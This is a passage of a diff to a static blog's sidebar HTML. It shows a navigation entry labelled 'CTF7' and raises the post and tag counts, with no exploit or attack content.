href="#CTF7"><span class="nav-number">11.</span> <span class="nav-text">CTF7</span></a></li></ol></div>
       </div>
       <!--/noindex-->
       <div class="site-overview-wrap sidebar-panel">
@@ -402,12 +940,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
